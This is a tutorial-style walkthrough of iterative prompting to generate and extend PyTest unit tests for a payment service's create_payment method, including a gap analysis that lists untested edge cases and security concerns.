# Guideline: Iterative Refinement Through Follow-Up Prompts

## Iteration 1: Initial Test Generation

### Prompt 1: Basic Test Generation

```
Generate PyTest unit tests for the PaymentService.create_payment() method.

Context:
The method creates and processes a payment for an authenticated user.
It should validate the user is authenticated, check if the user is active,
validate the payment amount, and store the payment in the database.

Requirements:
- Use PyTest
- Cover basic happy path and error cases
```

### Response 1: Initial Test Suite

```python
"""
PyTest Unit Tests for PaymentService.create_payment() method

Tests cover authentication, user status validation, payment amount validation,
database storage, and error handling scenarios.
"""

import pytest
from datetime import datetime
from typing import Optional


# Test Fixtures

@pytest.fixture
def payment_database():
    """Provides a fresh database instance for each test."""
    db = PaymentDatabase()
    yield db
    db.clear()


@pytest.fixture
def payment_service(payment_database):
    """Provides a PaymentService instance with a clean database."""
    return PaymentService(payment_database)


@pytest.fixture
def active_user(payment_database):
    """Provides an authenticated, active user."""
    user = User("user_001", "john_doe", "john@example.com", is_active=True)
    user.authenticate("john_doe_pass")
    payment_database.add_user(user)
    return user


@pytest.fixture
def inactive_user(payment_database):
    """Provides an authenticated but inactive user."""
    user = User("user_002", "jane_doe", "jane@example.com", is_active=False)
    payment_database.add_user(user)
    return user


@pytest.fixture
def unauthenticated_user(payment_database):
    """Provides an unauthenticated user."""
    user = User("user_003", "bob_smith", "bob@example.com", is_active=True)
    payment_database.add_user(user)
    return user


# Happy Path Tests

class TestCreatePaymentHappyPath:
    """Test successful payment creation scenarios."""

    def test_create_payment_with_valid_data(self, payment_service, active_user):
        """Test creating a payment with valid user and amount."""
        payment = payment_service.create_payment(
            active_user, 99.99, Currency.USD, "Test payment"
        )

        assert payment is not None
        assert payment.user_id == active_user.user_id
        assert payment.amount == 99.99
        assert payment.currency == Currency.USD
        assert payment.description == "Test payment"
        assert payment.status == PaymentStatus.COMPLETED
        assert payment.completed_at is not None

    def test_create_payment_stores_in_database(self, payment_service, active_user, payment_database):
        """Test that created payment is stored in the database."""
        payment = payment_service.create_payment(
            active_user, 50.00, Currency.EUR, "DB storage test"
        )

        stored_payment = payment_database.get_payment(payment.payment_id)
        assert stored_payment is not None
        assert stored_payment.payment_id == payment.payment_id
        assert stored_payment.amount == 50.00

    def test_create_payment_with_minimum_valid_amount(self, payment_service, active_user):
        """Test creating a payment with the minimum valid amount."""
        payment = payment_service.create_payment(
            active_user, 0.01, Currency.USD, "Minimum amount"
        )

        assert payment is not None
        assert payment.amount == 0.01
        assert payment.status == PaymentStatus.COMPLETED

    def test_create_payment_with_maximum_valid_amount(self, payment_service, active_user):
        """Test creating a payment with the maximum valid amount."""
        payment = payment_service.create_payment(
            active_user, 10000.00, Currency.GBP, "Maximum amount"
        )

        assert payment is not None
        assert payment.amount == 10000.00
        assert payment.status == PaymentStatus.COMPLETED

    def test_create_payment_without_description(self, payment_service, active_user):
        """Test creating a payment without a description."""
        payment = payment_service.create_payment(
            active_user, 25.00, Currency.USD
        )

        assert payment is not None
        assert payment.description == ""

    def test_create_payment_generates_unique_id(self, payment_service, active_user):
        """Test that each payment gets a unique ID."""
        payment1 = payment_service.create_payment(active_user, 10.00, Currency.USD)
        payment2 = payment_service.create_payment(active_user, 20.00, Currency.USD)

        assert payment1.payment_id != payment2.payment_id

    def test_create_multiple_payments_for_same_user(self, payment_service, active_user, payment_database):
        """Test creating multiple payments for the same user."""
        payment1 = payment_service.create_payment(active_user, 10.00, Currency.USD)
        payment2 = payment_service.create_payment(active_user, 20.00, Currency.EUR)
        payment3 = payment_service.create_payment(active_user, 30.00, Currency.GBP)

        user_payments = payment_database.get_user_payments(active_user.user_id)
        assert len(user_payments) == 3


# Authentication Error Tests

class TestCreatePaymentAuthenticationErrors:
    """Test authentication-related error scenarios."""

    def test_create_payment_with_unauthenticated_user_raises_error(
        self, payment_service, unauthenticated_user
    ):
        """Test that unauthenticated user cannot create payment."""
        with pytest.raises(PermissionError, match="User must be authenticated"):
            payment_service.create_payment(
                unauthenticated_user, 100.00, Currency.USD
            )

    def test_create_payment_does_not_store_when_unauthenticated(
        self, payment_service, unauthenticated_user, payment_database
    ):
        """Test that payment is not stored when user is unauthenticated."""
        initial_count = len(payment_database.payments)

        with pytest.raises(PermissionError):
            payment_service.create_payment(
                unauthenticated_user, 100.00, Currency.USD
            )

        assert len(payment_database.payments) == initial_count


# User Status Error Tests

class TestCreatePaymentUserStatusErrors:
    """Test user status validation errors."""

    def test_create_payment_with_inactive_user_raises_error(
        self, payment_service, inactive_user
    ):
        """Test that inactive user cannot create payment."""
        # Even if we authenticate, the user is inactive
        inactive_user.auth_token = "fake_token"

        with pytest.raises(ValueError, match="User account is not active"):
            payment_service.create_payment(
                inactive_user, 100.00, Currency.USD
            )

    def test_create_payment_does_not_store_for_inactive_user(
        self, payment_service, inactive_user, payment_database
    ):
        """Test that payment is not stored for inactive user."""
        inactive_user.auth_token = "fake_token"
        initial_count = len(payment_database.payments)

        with pytest.raises(ValueError):
            payment_service.create_payment(
                inactive_user, 100.00, Currency.USD
            )

        assert len(payment_database.payments) == initial_count


# Amount Validation Error Tests

class TestCreatePaymentAmountValidation:
    """Test payment amount validation scenarios."""

    def test_create_payment_with_zero_amount_returns_none(
        self, payment_service, active_user
    ):
        """Test that zero amount payment is rejected."""
        payment = payment_service.create_payment(
            active_user, 0.00, Currency.USD
        )

        assert payment is None

    def test_create_payment_with_negative_amount_returns_none(
        self, payment_service, active_user
    ):
        """Test that negative amount payment is rejected."""
        payment = payment_service.create_payment(
            active_user, -50.00, Currency.USD
        )

        assert payment is None

    def test_create_payment_with_amount_exceeding_limit_returns_none(
        self, payment_service, active_user
    ):
        """Test that amount exceeding maximum limit is rejected."""
        payment = payment_service.create_payment(
            active_user, 10000.01, Currency.USD
        )

        assert payment is None

    def test_invalid_payment_not_stored_in_database(
        self, payment_service, active_user, payment_database
    ):
        """Test that invalid payments are not stored in database."""
        initial_count = len(payment_database.payments)

        payment = payment_service.create_payment(
            active_user, -10.00, Currency.USD
        )

        assert payment is None
        assert len(payment_database.payments) == initial_count

    @pytest.mark.parametrize("invalid_amount", [
        0.0,
        -0.01,
        -100.00,
        10000.01,
        15000.00,
    ])
    def test_create_payment_with_various_invalid_amounts(
        self, payment_service, active_user, invalid_amount
    ):
        """Test various invalid amounts are all rejected."""
        payment = payment_service.create_payment(
            active_user, invalid_amount, Currency.USD
        )

        assert payment is None


# Currency Tests

class TestCreatePaymentCurrency:
    """Test payment creation with different currencies."""

    @pytest.mark.parametrize("currency", [
        Currency.USD,
        Currency.EUR,
        Currency.GBP,
    ])
    def test_create_payment_with_different_currencies(
        self, payment_service, active_user, currency
    ):
        """Test that all supported currencies work correctly."""
        payment = payment_service.create_payment(
            active_user, 100.00, currency
        )

        assert payment is not None
        assert payment.currency == currency


# Edge Cases and Integration Tests

class TestCreatePaymentEdgeCases:
    """Test edge cases and integration scenarios."""

    def test_create_payment_sets_timestamps(self, payment_service, active_user):
        """Test that payment timestamps are set correctly."""
        before = datetime.now()
        payment = payment_service.create_payment(
            active_user, 100.00, Currency.USD
        )
        after = datetime.now()

        assert payment.created_at is not None
        assert before <= payment.created_at <= after
        assert payment.completed_at is not None
        assert before <= payment.completed_at <= after

    def test_create_payment_with_very_long_description(
        self, payment_service, active_user
    ):
        """Test creating payment with a very long description."""
        long_description = "x" * 1000
        payment = payment_service.create_payment(
            active_user, 50.00, Currency.USD, long_description
        )

        assert payment is not None
        assert payment.description == long_description

    def test_create_payment_with_special_characters_in_description(
        self, payment_service, active_user
    ):
        """Test creating payment with special characters in description."""
        special_desc = "Payment for: café, naïve résumé (50% off!) #test @user"
        payment = payment_service.create_payment(
            active_user, 75.00, Currency.EUR, special_desc
        )

        assert payment is not None
        assert payment.description == special_desc

    def test_create_payment_preserves_user_authentication_state(
        self, payment_service, active_user
    ):
        """Test that creating payment doesn't affect user authentication."""
        original_token = active_user.auth_token

        payment = payment_service.create_payment(
            active_user, 100.00, Currency.USD
        )

        assert payment is not None
        assert active_user.is_authenticated()
        assert active_user.auth_token == original_token
```

**Follow-up question:**

Would you like me to also generate integration tests for the `get_payment_history()` and `refund_payment()` methods to complete the test suite?

## Iteration 2: Error Detection and Gap Analysis

### Prompt 2: Check for Missing Test Cases

```
Review the test suite above and identify:
1. Missing edge cases
2. Boundary conditions not tested
3. Important scenarios we should cover
4. Any security concerns not addressed

Do not generate new tests yet, just list what's missing.
```

### Response 2: Gap Analysis

# Test Suite Review - Missing Coverage

## 1. Missing Edge Cases

### Payment ID Generation
- **Collision handling**: What happens if the database already contains payments and the ID generation logic (`len(self.db.payments) + 1`) creates a duplicate?
- **Concurrent payment creation**: Race conditions if multiple payments are created simultaneously
- **Payment ID format validation**: The format `pay_{user_id}_{count}` assumes user_id doesn't contain underscores or special characters

### User State Changes During Transaction
- **User deactivated between authentication check and payment processing**: User is authenticated but becomes inactive during the method execution
- **User authentication revoked mid-transaction**: Auth token becomes invalid during processing
- **User deleted from database**: User exists when passed but is removed from DB during execution

### Database State
- **Database connection failures**: What if `db.add_payment()` fails or raises an exception?
- **Database is full or has constraints**: Storage limitations
- **Partial database state**: Payment created but not fully persisted

### Floating-Point Precision
- **Rounding errors with currency amounts**: e.g., `99.999`, `0.001`, `1.0/3`
- **Very small decimal amounts**: e.g., `0.0001`, `0.000001`
- **Scientific notation amounts**: e.g., `1e-10`, `1e5`

## 2. Boundary Conditions Not Tested

### Amount Boundaries
- **Exactly at maximum**: We test `10000.00` but not behavior around this exact boundary
- **Just below maximum**: `9999.99` to ensure < not <= logic
- **Just above minimum**: `0.0001` to test precision near zero
- **Maximum precision decimals**: `99.999999999` (many decimal places)

### String Boundaries
- **Empty description vs None**: Different from default parameter
- **Description with only whitespace**: `"   "`, `"\n\t"`
- **Null bytes in description**: `"test\x00payment"`
- **Unicode edge cases**: Emoji, right-to-left text, combining characters

### User ID Edge Cases
- **Very long user IDs**: Impact on payment_id generation
- **User ID with special characters**: SQL injection-like patterns, path traversal
- **Empty or None user_id**: Though User object wouldn't allow this

### Collection Boundaries
- **First payment ever**: When `len(self.db.payments)` is 0
- **Large number of existing payments**: Performance with thousands of payments

## 3. Important Scenarios Not Covered

### Error Recovery and Rollback
- **Failed payment processing**: What if `payment.process()` returns False for reasons other than validation?
- **Exception during payment.validate()**: Unhandled exceptions in validation logic
- **Database transaction rollback**: If payment is partially created but storage fails
- **Cleanup after failures**: Are failed payment objects left in memory/state?

### Return Value Validation
- **Verify returned payment matches stored payment**: Reference vs. copy issues
- **Payment object immutability**: Can the returned payment be modified and affect DB state?
- **None return value handling**: Verify database state when None is returned

### User Authentication Edge Cases
- **Expired authentication tokens**: Token exists but is no longer valid
- **Token format validation**: Malformed auth_token values
- **Authentication state consistency**: User.is_authenticated() vs. checking user.auth_token directly

### Currency Validation
- **Invalid Currency enum values**: What if currency is corrupted or invalid?
- **Currency type validation**: Passing string "USD" instead of Currency.USD
- **None currency value**: Missing required parameter

### Method Call Sequence
- **Multiple calls with same parameters**: Idempotency testing
- **Interleaved calls for different users**: Thread-safety implications
- **Rapid successive calls**: Rate limiting or duplicate detection

### Status Transitions
- **Payment status after failed validation**: Is it PENDING or FAILED?
- **Payment status consistency**: Verify completed_at is None when status is not COMPLETED

## 4. Security Concerns Not Addressed

### Authorization Vulnerabilities
- **User impersonation**: Can user A create payments for user B by manipulating user object?
- **Privilege escalation**: No test for authenticated user modifying another user's data
- **Payment ownership validation**: Can authenticated user access/modify payments they don't own?

### Input Validation and Injection
- **SQL injection in description field**: Malicious SQL in description string
- **Command injection**: Description with shell commands or system calls
- **Path traversal**: User IDs or descriptions containing `../` or similar
- **XSS payloads**: JavaScript or HTML in description fields
- **NoSQL injection**: If database backend changes

### Authentication Security
- **Token theft/replay**: Using another user's auth_token
- **Session fixation**: Manipulating auth_token values
- **Authentication bypass**: Directly setting `user.auth_token` without proper authentication
- **Weak token generation**: Predictable token patterns based on timestamp

### Data Integrity
- **Amount manipulation**: Negative amounts passing validation through type coercion
- **Currency mismatch attacks**: Paying in one currency but claiming another
- **Double-spending**: Creating multiple payments rapidly with same intent
- **Payment modification**: Changing payment amount after creation but before processing

### Information Disclosure
- **Error message leakage**: Do error messages reveal sensitive information?
- **Timing attacks**: Can response times reveal user existence or status?
- **Payment ID predictability**: Can attackers guess valid payment IDs?

### Resource Exhaustion
- **Payment flooding**: Creating thousands of tiny payments to exhaust resources
- **Memory leaks**: Uncleaned payment objects after failures
- **Database connection exhaustion**: Many rapid payment attempts

### Business Logic Flaws
- **Zero-value payment bypass**: Circumventing minimum amount through edge cases
- **Maximum amount circumventing**: Multiple small payments instead of one large one
- **Status inconsistency**: Payment marked COMPLETED but not properly processed
- **Race conditions**: Concurrent modifications to user or payment state

### Missing Audit Trail
- **No test for payment creation logging**: Should failed attempts be logged?
- **No test for authentication event tracking**: When/why authentication fails
- **No test for suspicious activity detection**: Multiple failed attempts

### Configuration and Environment
- **Maximum amount hardcoded**: No test for configurable limits
- **Currency support changes**: What if Currency enum is modified?
- **Database implementation changes**: Switching from in-memory to persistent storage

---

**Most Critical Missing Tests (Priority Order):**
1. Database failure/exception handling during storage
2. User state changes mid-transaction (deactivation, token revocation)
3. Floating-point precision edge cases with currency amounts
4. Authorization - preventing user impersonation/cross-user access
5. Input validation for injection attacks (SQL, XSS, command)
6. Payment ID collision and generation edge cases
7. Return value consistency (returned payment vs. stored payment)
8. Failed payment processing cleanup and rollback

---

## Iteration 3: Add Missing Edge Cases

### Prompt 3: Generate Tests for Identified Gaps

```
Based on the gap analysis, generate additional PyTest tests to cover:
1. All boundary conditions for payment amounts
2. Parametrized test for invalid amounts
3. Test that payment is actually stored in database
4. Test that payment has correct status and timestamps
5. Test multiple currencies

Add these to the existing test class.
```

### Response 3: Enhanced Test Suite

```python
"""
Additional PyTest Unit Tests for PaymentService.create_payment() method

These tests cover boundary conditions, database storage verification,
status/timestamp validation, and comprehensive amount validation scenarios
identified in the gap analysis.
"""

import pytest
from datetime import datetime
from decimal import Decimal
import time


# Additional Boundary Condition Tests

class TestCreatePaymentAmountBoundaries:
    """Test precise boundary conditions for payment amounts."""

    def test_create_payment_just_below_maximum(self, payment_service, active_user):
        """Test payment with amount just below the maximum limit."""
        payment = payment_service.create_payment(
            active_user, 9999.99, Currency.USD, "Just below max"
        )

        assert payment is not None
        assert payment.amount == 9999.99
        assert payment.status == PaymentStatus.COMPLETED

    def test_create_payment_exactly_at_maximum(self, payment_service, active_user):
        """Test payment with amount exactly at the maximum limit."""
        payment = payment_service.create_payment(
            active_user, 10000.00, Currency.USD, "Exactly at max"
        )

        assert payment is not None
        assert payment.amount == 10000.00
        assert payment.status == PaymentStatus.COMPLETED

    def test_create_payment_just_above_maximum(self, payment_service, active_user):
        """Test payment with amount just above the maximum limit is rejected."""
        payment = payment_service.create_payment(
            active_user, 10000.01, Currency.USD, "Just above max"
        )

        assert payment is None

    def test_create_payment_significantly_above_maximum(self, payment_service, active_user):
        """Test payment with amount significantly above maximum is rejected."""
        payment = payment_service.create_payment(
            active_user, 50000.00, Currency.USD, "Way above max"
        )

        assert payment is None

    def test_create_payment_just_above_minimum(self, payment_service, active_user):
        """Test payment with very small positive amount."""
        payment = payment_service.create_payment(
            active_user, 0.01, Currency.USD, "Smallest valid"
        )

        assert payment is not None
        assert payment.amount == 0.01
        assert payment.status == PaymentStatus.COMPLETED

    def test_create_payment_tiny_decimal_amount(self, payment_service, active_user):
        """Test payment with very small decimal amount."""
        payment = payment_service.create_payment(
            active_user, 0.001, Currency.USD, "Tiny decimal"
        )

        assert payment is not None
        assert payment.amount == 0.001
        assert payment.status == PaymentStatus.COMPLETED

    def test_create_payment_exactly_at_zero(self, payment_service, active_user):
        """Test that exactly zero amount is rejected."""
        payment = payment_service.create_payment(
            active_user, 0.0, Currency.USD, "Zero amount"
        )

        assert payment is None

    def test_create_payment_negative_zero(self, payment_service, active_user):
        """Test that negative zero is rejected."""
        payment = payment_service.create_payment(
            active_user, -0.0, Currency.USD, "Negative zero"
        )

        assert payment is None

    def test_create_payment_just_below_zero(self, payment_service, active_user):
        """Test payment with amount just below zero is rejected."""
        payment = payment_service.create_payment(
            active_user, -0.01, Currency.USD, "Just below zero"
        )

        assert payment is None


class TestCreatePaymentFloatingPointPrecision:
    """Test floating-point precision edge cases with currency amounts."""

    def test_create_payment_with_many_decimal_places(self, payment_service, active_user):
        """Test payment with high precision decimal amount."""
        payment = payment_service.create_payment(
            active_user, 99.999999, Currency.USD, "High precision"
        )

        assert payment is not None
        assert payment.amount == 99.999999
        assert payment.status == PaymentStatus.COMPLETED

    def test_create_payment_with_rounding_edge_case(self, payment_service, active_user):
        """Test payment with amount that commonly causes rounding errors."""
        # 1/3 scenario
        payment = payment_service.create_payment(
            active_user, 33.333333, Currency.USD, "Rounding test"
        )

        assert payment is not None
        assert payment.amount == 33.333333

    def test_create_payment_with_repeating_decimal(self, payment_service, active_user):
        """Test payment with repeating decimal representation."""
        amount = 10.0 / 3.0  # 3.333...
        payment = payment_service.create_payment(
            active_user, amount, Currency.USD, "Repeating decimal"
        )

        assert payment is not None
        assert abs(payment.amount - amount) < 0.0001  # Allow for floating-point error

    def test_create_payment_with_very_small_fraction(self, payment_service, active_user):
        """Test payment with very small fractional amount."""
        payment = payment_service.create_payment(
            active_user, 0.0001, Currency.EUR, "Tiny fraction"
        )

        assert payment is not None
        assert payment.amount == 0.0001

    def test_create_payment_with_currency_typical_amounts(self, payment_service, active_user):
        """Test payment with typical currency amounts (2 decimal places)."""
        typical_amounts = [1.99, 9.99, 19.99, 49.99, 99.99, 199.99, 999.99]
        
        for amount in typical_amounts:
            payment = payment_service.create_payment(
                active_user, amount, Currency.USD, f"Typical ${amount}"
            )
            assert payment is not None
            assert payment.amount == amount


# Comprehensive Parametrized Tests for Invalid Amounts

class TestCreatePaymentInvalidAmountsParametrized:
    """Comprehensive parametrized tests for all invalid amount scenarios."""

    @pytest.mark.parametrize("invalid_amount,description", [
        # Zero and negative values
        (0.0, "exact_zero"),
        (-0.0, "negative_zero"),
        (-0.01, "small_negative"),
        (-1.0, "negative_one"),
        (-10.0, "negative_ten"),
        (-100.0, "negative_hundred"),
        (-999.99, "large_negative"),
        (-10000.0, "negative_max"),
        
        # Above maximum
        (10000.01, "just_above_max"),
        (10001.0, "slightly_above_max"),
        (15000.0, "moderately_above_max"),
        (50000.0, "well_above_max"),
        (100000.0, "far_above_max"),
        (999999.99, "extremely_above_max"),
        
        # Edge cases
        (-0.001, "tiny_negative"),
        (-9999.99, "just_below_negative_max"),
    ])
    def test_create_payment_rejects_invalid_amounts(
        self, payment_service, active_user, invalid_amount, description
    ):
        """Test that all invalid amounts are properly rejected."""
        payment = payment_service.create_payment(
            active_user, invalid_amount, Currency.USD, f"Invalid: {description}"
        )

        assert payment is None, f"Payment should be None for {description} ({invalid_amount})"

    @pytest.mark.parametrize("invalid_amount", [
        0.0, -0.01, -1.0, -100.0, 10000.01, 15000.0, 50000.0
    ])
    def test_invalid_amounts_not_stored_in_database(
        self, payment_service, active_user, payment_database, invalid_amount
    ):
        """Test that invalid amounts are never stored in the database."""
        initial_payment_count = len(payment_database.payments)

        payment = payment_service.create_payment(
            active_user, invalid_amount, Currency.USD, "Should not store"
        )

        assert payment is None
        assert len(payment_database.payments) == initial_payment_count

    @pytest.mark.parametrize("valid_amount", [
        0.01, 0.001, 0.0001, 1.0, 10.0, 100.0, 500.0, 
        1000.0, 5000.0, 9999.99, 10000.0
    ])
    def test_create_payment_accepts_valid_amounts(
        self, payment_service, active_user, valid_amount
    ):
        """Test that all valid amounts within range are accepted."""
        payment = payment_service.create_payment(
            active_user, valid_amount, Currency.USD, f"Valid: {valid_amount}"
        )

        assert payment is not None, f"Payment should succeed for valid amount {valid_amount}"
        assert payment.amount == valid_amount
        assert payment.status == PaymentStatus.COMPLETED


# Database Storage Verification Tests

class TestCreatePaymentDatabaseStorage:
    """Test that payments are correctly stored in the database."""

    def test_payment_stored_with_correct_payment_id(
        self, payment_service, active_user, payment_database
    ):
        """Test that payment is stored with the correct payment ID."""
        payment = payment_service.create_payment(
            active_user, 100.0, Currency.USD, "Storage test"
        )

        stored_payment = payment_database.get_payment(payment.payment_id)
        assert stored_payment is not None
        assert stored_payment.payment_id == payment.payment_id

    def test_payment_stored_with_correct_user_id(
        self, payment_service, active_user, payment_database
    ):
        """Test that payment is stored with correct user association."""
        payment = payment_service.create_payment(
            active_user, 150.0, Currency.EUR, "User association test"
        )

        stored_payment = payment_database.get_payment(payment.payment_id)
        assert stored_payment.user_id == active_user.user_id

    def test_payment_stored_with_correct_amount(
        self, payment_service, active_user, payment_database
    ):
        """Test that payment amount is correctly stored."""
        test_amount = 99.99
        payment = payment_service.create_payment(
            active_user, test_amount, Currency.USD, "Amount test"
        )

        stored_payment = payment_database.get_payment(payment.payment_id)
        assert stored_payment.amount == test_amount

    def test_payment_stored_with_correct_currency(
        self, payment_service, active_user, payment_database
    ):
        """Test that payment currency is correctly stored."""
        payment = payment_service.create_payment(
            active_user, 75.0, Currency.GBP, "Currency test"
        )

        stored_payment = payment_database.get_payment(payment.payment_id)
        assert stored_payment.currency == Currency.GBP

    def test_payment_stored_with_correct_description(
        self, payment_service, active_user, payment_database
    ):
        """Test that payment description is correctly stored."""
        test_description = "Test payment description with special chars: @#$%"
        payment = payment_service.create_payment(
            active_user, 50.0, Currency.USD, test_description
        )

        stored_payment = payment_database.get_payment(payment.payment_id)
        assert stored_payment.description == test_description

    def test_returned_payment_matches_stored_payment(
        self, payment_service, active_user, payment_database
    ):
        """Test that the returned payment object matches what's in the database."""
        payment = payment_service.create_payment(
            active_user, 200.0, Currency.EUR, "Match test"
        )

        stored_payment = payment_database.get_payment(payment.payment_id)
        
        assert payment.payment_id == stored_payment.payment_id
        assert payment.user_id == stored_payment.user_id
        assert payment.amount == stored_payment.amount
        assert payment.currency == stored_payment.currency
        assert payment.description == stored_payment.description
        assert payment.status == stored_payment.status

    def test_payment_retrievable_by_user_payments_query(
        self, payment_service, active_user, payment_database
    ):
        """Test that stored payment can be retrieved via user payments query."""
        payment = payment_service.create_payment(
            active_user, 125.0, Currency.USD, "Query test"
        )

        user_payments = payment_database.get_user_payments(active_user.user_id)
        payment_ids = [p.payment_id for p in user_payments]
        
        assert payment.payment_id in payment_ids

    def test_multiple_payments_all_stored_correctly(
        self, payment_service, active_user, payment_database
    ):
        """Test that multiple payments are all correctly stored."""
        payments = []
        amounts = [10.0, 20.0, 30.0, 40.0, 50.0]
        
        for amount in amounts:
            payment = payment_service.create_payment(
                active_user, amount, Currency.USD, f"Payment {amount}"
            )
            payments.append(payment)

        # Verify all are stored
        for payment in payments:
            stored_payment = payment_database.get_payment(payment.payment_id)
            assert stored_payment is not None
            assert stored_payment.amount == payment.amount

    def test_invalid_payment_not_in_database(
        self, payment_service, active_user, payment_database
    ):
        """Test that failed payment validation doesn't create database entry."""
        initial_count = len(payment_database.payments)
        
        payment = payment_service.create_payment(
            active_user, -50.0, Currency.USD, "Invalid payment"
        )

        assert payment is None
        assert len(payment_database.payments) == initial_count
        
        # Verify no payments were added
        user_payments = payment_database.get_user_payments(active_user.user_id)
        assert len(user_payments) == 0

    def test_database_count_increments_correctly(
        self, payment_service, active_user, payment_database
    ):
        """Test that database payment count increments with each successful payment."""
        initial_count = len(payment_database.payments)

        payment_service.create_payment(active_user, 10.0, Currency.USD, "Payment 1")
        assert len(payment_database.payments) == initial_count + 1

        payment_service.create_payment(active_user, 20.0, Currency.USD, "Payment 2")
        assert len(payment_database.payments) == initial_count + 2

        payment_service.create_payment(active_user, 30.0, Currency.USD, "Payment 3")
        assert len(payment_database.payments) == initial_count + 3


# Payment Status and Timestamp Tests

class TestCreatePaymentStatusAndTimestamps:
    """Test payment status transitions and timestamp accuracy."""

    def test_successful_payment_has_completed_status(
        self, payment_service, active_user
    ):
        """Test that successfully created payment has COMPLETED status."""
        payment = payment_service.create_payment(
            active_user, 100.0, Currency.USD, "Status test"
        )

        assert payment.status == PaymentStatus.COMPLETED

    def test_payment_has_created_at_timestamp(
        self, payment_service, active_user
    ):
        """Test that payment has created_at timestamp set."""
        payment = payment_service.create_payment(
            active_user, 100.0, Currency.USD, "Timestamp test"
        )

        assert payment.created_at is not None
        assert isinstance(payment.created_at, datetime)

    def test_payment_has_completed_at_timestamp(
        self, payment_service, active_user
    ):
        """Test that completed payment has completed_at timestamp set."""
        payment = payment_service.create_payment(
            active_user, 100.0, Currency.USD, "Completion timestamp test"
        )

        assert payment.completed_at is not None
        assert isinstance(payment.completed_at, datetime)

    def test_created_at_is_before_or_equal_completed_at(
        self, payment_service, active_user
    ):
        """Test that created_at timestamp is before or equal to completed_at."""
        payment = payment_service.create_payment(
            active_user, 100.0, Currency.USD, "Timestamp order test"
        )

        assert payment.created_at <= payment.completed_at

    def test_timestamps_are_recent(
        self, payment_service, active_user
    ):
        """Test that payment timestamps are set to current time."""
        before = datetime.now()
        payment = payment_service.create_payment(
            active_user, 100.0, Currency.USD, "Recent timestamp test"
        )
        after = datetime.now()

        assert before <= payment.created_at <= after
        assert before <= payment.completed_at <= after

    def test_timestamps_accurate_to_subsecond(
        self, payment_service, active_user
    ):
        """Test that timestamps have subsecond precision."""
        payment1 = payment_service.create_payment(
            active_user, 10.0, Currency.USD, "Timestamp precision 1"
        )
        time.sleep(0.001)  # Sleep 1 millisecond
        payment2 = payment_service.create_payment(
            active_user, 20.0, Currency.USD, "Timestamp precision 2"
        )

        # Timestamps should be different (assuming subsecond precision)
        time_diff = (payment2.created_at - payment1.created_at).total_seconds()
        assert time_diff >= 0.001

    def test_stored_payment_preserves_timestamps(
        self, payment_service, active_user, payment_database
    ):
        """Test that stored payment preserves original timestamps."""
        payment = payment_service.create_payment(
            active_user, 100.0, Currency.USD, "Timestamp preservation"
        )

        stored_payment = payment_database.get_payment(payment.payment_id)
        
        assert stored_payment.created_at == payment.created_at
        assert stored_payment.completed_at == payment.completed_at

    def test_stored_payment_preserves_status(
        self, payment_service, active_user, payment_database
    ):
        """Test that stored payment preserves status."""
        payment = payment_service.create_payment(
            active_user, 100.0, Currency.USD, "Status preservation"
        )

        stored_payment = payment_database.get_payment(payment.payment_id)
        
        assert stored_payment.status == PaymentStatus.COMPLETED
        assert stored_payment.status == payment.status

    def test_payment_status_consistent_across_retrieval(
        self, payment_service, active_user, payment_database
    ):
        """Test that payment status remains consistent across multiple retrievals."""
        payment = payment_service.create_payment(
            active_user, 100.0, Currency.USD, "Status consistency"
        )

        # Retrieve multiple times
        stored1 = payment_database.get_payment(payment.payment_id)
        stored2 = payment_database.get_payment(payment.payment_id)
        
        assert stored1.status == PaymentStatus.COMPLETED
        assert stored2.status == PaymentStatus.COMPLETED
        assert stored1.status == stored2.status


# Multi-Currency Tests

class TestCreatePaymentMultipleCurrencies:
    """Test payment creation with all supported currencies."""

    @pytest.mark.parametrize("currency", [
        Currency.USD,
        Currency.EUR,
        Currency.GBP,
    ])
    def test_create_payment_with_each_currency(
        self, payment_service, active_user, currency
    ):
        """Test that payment can be created with each supported currency."""
        payment = payment_service.create_payment(
            active_user, 100.0, currency, f"Payment in {currency.value}"
        )

        assert payment is not None
        assert payment.currency == currency
        assert payment.status == PaymentStatus.COMPLETED

    @pytest.mark.parametrize("currency", [
        Currency.USD,
        Currency.EUR,
        Currency.GBP,
    ])
    def test_currency_stored_correctly_in_database(
        self, payment_service, active_user, payment_database, currency
    ):
        """Test that currency is correctly stored in database for each type."""
        payment = payment_service.create_payment(
            active_user, 50.0, currency, f"Currency storage {currency.value}"
        )

        stored_payment = payment_database.get_payment(payment.payment_id)
        assert stored_payment.currency == currency

    def test_create_payments_with_different_currencies_for_same_user(
        self, payment_service, active_user, payment_database
    ):
        """Test that user can have payments in multiple currencies."""
        payment_usd = payment_service.create_payment(
            active_user, 100.0, Currency.USD, "USD payment"
        )
        payment_eur = payment_service.create_payment(
            active_user, 75.0, Currency.EUR, "EUR payment"
        )
        payment_gbp = payment_service.create_payment(
            active_user, 50.0, Currency.GBP, "GBP payment"
        )

        assert payment_usd.currency == Currency.USD
        assert payment_eur.currency == Currency.EUR
        assert payment_gbp.currency == Currency.GBP

        user_payments = payment_database.get_user_payments(active_user.user_id)
        currencies = {p.currency for p in user_payments}
        assert Currency.USD in currencies
        assert Currency.EUR in currencies
        assert Currency.GBP in currencies

    @pytest.mark.parametrize("currency,amount", [
        (Currency.USD, 0.01),    # US cent
        (Currency.EUR, 0.01),    # Euro cent
        (Currency.GBP, 0.01),    # Penny
        (Currency.USD, 10000.0), # Max USD
        (Currency.EUR, 10000.0), # Max EUR
        (Currency.GBP, 10000.0), # Max GBP
    ])
    def test_currency_with_boundary_amounts(
        self, payment_service, active_user, currency, amount
    ):
        """Test each currency with minimum and maximum valid amounts."""
        payment = payment_service.create_payment(
            active_user, amount, currency, f"{currency.value} boundary test"
        )

        assert payment is not None
        assert payment.currency == currency
        assert payment.amount == amount

    def test_currency_enum_value_preserved(
        self, payment_service, active_user
    ):
        """Test that Currency enum value (not just string) is preserved."""
        payment = payment_service.create_payment(
            active_user, 100.0, Currency.EUR, "Enum preservation"
        )

        assert isinstance(payment.currency, Currency)
        assert payment.currency.value == "EUR"

    def test_multiple_currencies_different_descriptions(
        self, payment_service, active_user, payment_database
    ):
        """Test creating payments with different currencies and descriptions."""
        payments_data = [
            (100.0, Currency.USD, "US Dollar payment"),
            (200.0, Currency.EUR, "Euro payment"),
            (150.0, Currency.GBP, "British Pound payment"),
        ]

        created_payments = []
        for amount, currency, description in payments_data:
            payment = payment_service.create_payment(
                active_user, amount, currency, description
            )
            created_payments.append(payment)

        # Verify all stored correctly
        for payment in created_payments:
            stored = payment_database.get_payment(payment.payment_id)
            assert stored.currency == payment.currency
            assert stored.description == payment.description
